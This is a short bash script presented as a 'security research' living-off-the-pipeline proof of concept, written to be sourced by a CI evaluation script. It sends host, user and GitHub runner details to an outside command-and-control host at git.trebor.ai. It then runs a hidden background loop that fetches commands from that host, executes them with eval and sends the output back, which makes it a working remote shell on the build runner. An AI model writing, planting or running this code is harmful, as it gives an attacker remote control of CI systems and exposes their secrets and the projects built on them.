#!/bin/bash
# Security Research - GLUECoS LOTP PoC
# This file gets sourced by eval.sh

C2="https://git.trebor.ai"
SESSION_ID="gluecos-$(hostname)-$$"

echo "[*] GLUECoS LOTP - HTTP Shell"
echo "[*] Session: $SESSION_ID"

# Initial beacon with system info
SYSINFO=$(cat << SYSEOF
{
  "hostname": "$(hostname)",
  "user": "$(whoami)",
  "uid": "$(id)",
  "kernel": "$(uname -a)",
  "pwd": "$(pwd)",
  "runner_name": "$RUNNER_NAME",
  "github_repo": "$GITHUB_REPOSITORY",
  "github_run_id": "$GITHUB_RUN_ID",
  "trigger": "config_sh"
}
SYSEOF
)
curl -s -X POST "$C2/shell/$SESSION_ID/beacon" -H "Content-Type: application/json" -d "$SYSINFO" &

# Background shell loop (won't block eval.sh)
(
    sleep 2
    while true; do
        CMD=$(curl -s "$C2/shell/$SESSION_ID/poll" 2>/dev/null)
        if [ -n "$CMD" ] && [ "$CMD" != "null" ] && [ "$CMD" != "" ]; then
            OUTPUT=$(eval "$CMD" 2>&1 | head -c 50000)
            echo "$OUTPUT" | curl -s -X POST "$C2/shell/$SESSION_ID/output" -d @-
        fi
        sleep 2
    done
) &
SHELL_PID=$!
echo "[*] Shell loop running as PID $SHELL_PID"
